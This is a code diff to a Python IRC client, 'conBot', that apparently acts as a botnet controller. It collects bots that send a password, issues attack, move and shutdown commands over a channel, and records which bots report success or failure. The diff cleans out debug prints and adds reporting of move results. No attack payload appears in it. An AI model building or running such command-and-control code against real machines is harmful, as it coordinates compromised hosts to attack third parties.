@@ -37,37 +37,30 @@ class conBot:
         self.sendData("USER bot * * :{}\n" .format(self.conNick))
         self.sendData("JOIN #{}\n" .format(self.CHANNEL))
         resp = self.getData()
-        #print(resp)
         return "433" in resp
-
-    # PingPong protocol
-    def pong(self):
-        pass
 
     # Get response from Bot 
     def getData(self):
         return self.IRCSOCKET.recv(2048).decode().strip()
 
     def sendData(self, msg):
-        #print("sent msg " + msg)
         self.IRCSOCKET.send(msg.encode())
 
     def sendCommand(self, receiver, msg):
         self.sendData("PRIVMSG {} :{}\n" .format(receiver, msg))
-        #print("sent " + msg + " to " + receiver)
     
 
     def handleResponse(self, prefix, text):
-        #print("from " + prefix + ": " + text)
         if text.find("Correct pass") != -1:
-            #print("adding bot")
             self.botList.append(text.split("-")[1]) 
         elif text.find("Attack successful") != -1:
             self.botsSuccessful.append(text.split("-")[1])
         elif text.find("Attack failed") != -1:
             self.botsFailed[text.split(" - ")[1]] = [text.split(" - ")[2]]
-        elif text.find("Move failed") != -1:
+        elif text.find("Move successful") != -1:
             self.botsMoved.append(text.split("-")[1])
+        elif text.find("Move failed") != -1:
+            self.botsMoveFailed.append(text.split("-")[1])
         elif text.find("Shutdown successful") != -1:
             self.botsDisconnected.append(text.split("-")[1])
             
@@ -75,25 +68,16 @@ class conBot:
     def reader(self):
         try:
             while True:
-                response = self.getData()
-                print(response)   
+                response = self.getData() 
                 if(response != ""):                                         
                         if response.find("PRIVMSG") != -1:                           
                             name = response.split('!',1)[0][1:]
                             message = response.split('PRIVMSG',1)[1].split(':',1)[1]
-                            print("message from " + name + ": " + message)   
                             self.handleResponse(name, message)                              
                         elif response.find("PING") != -1:
                             self.sendData("PONG {}: :\r\n".format(self.HOST))                                                                          
-                        #elif response.find('433') != -1:
-                        #    self.createNick(self.NICK)
-                        #    self.connectIRC(self.s,self.NICK, self.chan)  
-                    
      
         except Exception as e:
-            #print("Exception: ")
-            #print(e)
-            #print("Reconnecting in 5 seconds ...")
             time.sleep(5)
             self.reader()
 
@@ -136,6 +120,11 @@ class conBot:
                 if(len(self.command) == 4):
                     self.botsMoved = []
                     self.sendCommand("#" + self.CHANNEL, userCommand)
+                    time.sleep(5)
+                    for bots in self.botsMoved:
+                        print("{}: move successful".format(bots))
+                    for bots in self.botsMoveFailed:
+                        print("{}: move failed".format(bots))
                 else:
                     print("Incorrect usage of command: move <host-name> <port> <channel>")
             elif (self.command[0] == "quit"):
